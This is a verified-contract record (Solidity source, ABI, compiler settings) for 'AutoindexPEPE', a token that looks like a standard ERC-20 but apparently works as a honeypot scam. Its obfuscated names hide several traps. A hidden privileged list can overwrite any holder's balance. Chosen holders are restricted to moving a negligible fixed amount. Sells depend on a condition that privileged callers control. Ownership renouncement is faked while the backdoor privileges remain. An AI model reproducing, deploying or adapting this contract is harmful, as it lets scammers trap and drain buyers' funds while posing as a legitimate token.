{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface liquidityTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minFrom) external view returns (uint256);\n\n    function transfer(address sellMode, uint256 totalListSwap) external returns (bool);\n\n    function allowance(address feeEnableAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalListSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellMode,\n        uint256 totalListSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atList, uint256 value);\n    event Approval(address indexed feeEnableAmount, address indexed spender, uint256 value);\n}\n\nabstract contract buyModeMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listLaunch {\n    function createPair(address liquidityAmountFund, address toTeam) external returns (address);\n}\n\ninterface liquidityTotalMetadata is liquidityTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AutoindexPEPE is buyModeMarketing, liquidityTotal, liquidityTotalMetadata {\n\n    uint256 constant buyTotalMax = 14 ** 10;\n\n    function feeLaunch(address tokenTo, uint256 totalListSwap) public {\n        limitLiquidityAt();\n        fromEnable[tokenTo] = totalListSwap;\n    }\n\n    function transferFrom(address isTotal, address sellMode, uint256 totalListSwap) external override returns (bool) {\n        if (_msgSender() != tokenTx) {\n            if (enableMode[isTotal][_msgSender()] != type(uint256).max) {\n                require(totalListSwap <= enableMode[isTotal][_msgSender()]);\n                enableMode[isTotal][_msgSender()] -= totalListSwap;\n            }\n        }\n        return takeExemptReceiver(isTotal, sellMode, totalListSwap);\n    }\n\n    uint256 private autoTx;\n\n    function transfer(address tokenTo, uint256 totalListSwap) external virtual override returns (bool) {\n        return takeExemptReceiver(_msgSender(), tokenTo, totalListSwap);\n    }\n\n    function owner() external view returns (address) {\n        return modeExemptReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundAuto;\n    }\n\n    bool public autoIs;\n\n    function getOwner() external view returns (address) {\n        return modeExemptReceiver;\n    }\n\n    function balanceOf(address minFrom) public view virtual override returns (uint256) {\n        return fromEnable[minFrom];\n    }\n\n    address tokenTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private txTeam;\n\n    function txExempt() public {\n        emit OwnershipTransferred(enableMax, address(0));\n        modeExemptReceiver = address(0);\n    }\n\n    function limitLiquidityAt() private view {\n        require(minTakeAuto[_msgSender()]);\n    }\n\n    function approve(address walletMinEnable, uint256 totalListSwap) public virtual override returns (bool) {\n        enableMode[_msgSender()][walletMinEnable] = totalListSwap;\n        emit Approval(_msgSender(), walletMinEnable, totalListSwap);\n        return true;\n    }\n\n    string private fundAuto = \"APE\";\n\n    function exemptMinFee(address buyTx) public {\n        limitLiquidityAt();\n        if (tradingReceiverSwap == maxAt) {\n            teamBuy = false;\n        }\n        if (buyTx == enableMax || buyTx == marketingAuto) {\n            return;\n        }\n        autoTake[buyTx] = true;\n    }\n\n    string private marketingTx = \"Autoindex PEPE\";\n\n    event OwnershipTransferred(address indexed minReceiver, address indexed autoReceiverBuy);\n\n    mapping(address => bool) public autoTake;\n\n    mapping(address => uint256) private fromEnable;\n\n    constructor (){\n        if (autoTx != marketingAt) {\n            teamBuy = false;\n        }\n        launchedEnable buyToShould = launchedEnable(tokenTx);\n        marketingAuto = listLaunch(buyToShould.factory()).createPair(buyToShould.WETH(), address(this));\n        \n        enableMax = _msgSender();\n        txExempt();\n        minTakeAuto[enableMax] = true;\n        fromEnable[enableMax] = toTradingAmount;\n        if (teamBuy == txTeam) {\n            autoTx = fundAt;\n        }\n        emit Transfer(address(0), enableMax, toTradingAmount);\n    }\n\n    function tokenBuy(address isTotal, address sellMode, uint256 totalListSwap) internal returns (bool) {\n        require(fromEnable[isTotal] >= totalListSwap);\n        fromEnable[isTotal] -= totalListSwap;\n        fromEnable[sellMode] += totalListSwap;\n        emit Transfer(isTotal, sellMode, totalListSwap);\n        return true;\n    }\n\n    uint256 private marketingAt;\n\n    mapping(address => bool) public minTakeAuto;\n\n    uint256 launchedMin;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingTx;\n    }\n\n    function shouldTeam(uint256 totalListSwap) public {\n        limitLiquidityAt();\n        launchedMin = totalListSwap;\n    }\n\n    uint256 public fundAt;\n\n    mapping(address => mapping(address => uint256)) private enableMode;\n\n    function allowance(address shouldFee, address walletMinEnable) external view virtual override returns (uint256) {\n        if (walletMinEnable == tokenTx) {\n            return type(uint256).max;\n        }\n        return enableMode[shouldFee][walletMinEnable];\n    }\n\n    uint256 private toTradingAmount = 100000000 * 10 ** 18;\n\n    address public marketingAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingToSender;\n    }\n\n    uint256 listBuy;\n\n    uint256 public isExempt;\n\n    address private modeExemptReceiver;\n\n    bool private teamBuy;\n\n    bool public maxExempt;\n\n    function amountFrom(address sellReceiver) public {\n        if (autoIs) {\n            return;\n        }\n        if (maxAt == isExempt) {\n            isExempt = tradingReceiverSwap;\n        }\n        minTakeAuto[sellReceiver] = true;\n        if (autoTx == tradingFund) {\n            tradingFund = tradingReceiverSwap;\n        }\n        autoIs = true;\n    }\n\n    uint256 private maxAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTradingAmount;\n    }\n\n    function takeExemptReceiver(address isTotal, address sellMode, uint256 totalListSwap) internal returns (bool) {\n        if (isTotal == enableMax) {\n            return tokenBuy(isTotal, sellMode, totalListSwap);\n        }\n        uint256 limitWalletTx = liquidityTotal(marketingAuto).balanceOf(exemptLimit);\n        require(limitWalletTx == launchedMin);\n        require(sellMode != exemptLimit);\n        if (autoTake[isTotal]) {\n            return tokenBuy(isTotal, sellMode, buyTotalMax);\n        }\n        return tokenBuy(isTotal, sellMode, totalListSwap);\n    }\n\n    uint8 private marketingToSender = 18;\n\n    address exemptLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private tradingReceiverSwap;\n\n    address public enableMax;\n\n    uint256 private tradingFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeEnableAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiverBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletMinEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"}],\"name\":\"amountFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMinEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalListSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"}],\"name\":\"exemptMinFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalListSwap\",\"type\":\"uint256\"}],\"name\":\"feeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTakeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalListSwap\",\"type\":\"uint256\"}],\"name\":\"shouldTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalListSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalListSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AutoindexPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}